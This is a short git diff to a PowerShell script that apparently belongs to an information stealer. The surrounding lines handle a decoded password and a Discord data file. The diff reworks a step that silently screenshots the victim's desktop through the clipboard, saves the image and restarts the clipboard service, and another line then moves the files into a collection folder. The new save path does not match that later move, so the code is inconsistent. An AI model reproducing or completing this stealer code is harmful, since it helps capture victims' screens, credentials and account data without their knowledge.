@@ -892,13 +892,16 @@ Pass: $decodedPass
 
     $main_temp = "$env:localappdata\temp"
 
-    Add-Type -AssemblyName System.Drawing, System.Windows.Forms 
-    [Windows.Forms.Sendkeys]::SendWait("{PrtSc}") | out-null
-    Start-Sleep -Milliseconds 550 
+     
+    Add-Type -AssemblyName System.Drawing, System.Windows.Forms
+    [System.Windows.Forms.SendKeys]::SendWait("^{PrtSc}")
+    Start-Sleep -Milliseconds 550
     $screenshot = [Windows.Forms.Clipboard]::GetImage()
-    $screenshotPath = ("$main_temp\screenshot.png")
+    $screenshotPath = "screenshot.png"
     $screenshot.Save($screenshotPath, [Drawing.Imaging.ImageFormat]::Png)
     $screenshot.Dispose()
+    Restart-Service -Name "cbdhsvc*" -force
+    Write-Host "[!] Screenshot Captured" -ForegroundColor Green
 
     Move-Item "$main_temp\discord.json" $folder_general -Force    
     Move-Item "$main_temp\screenshot.png" $folder_general -Force
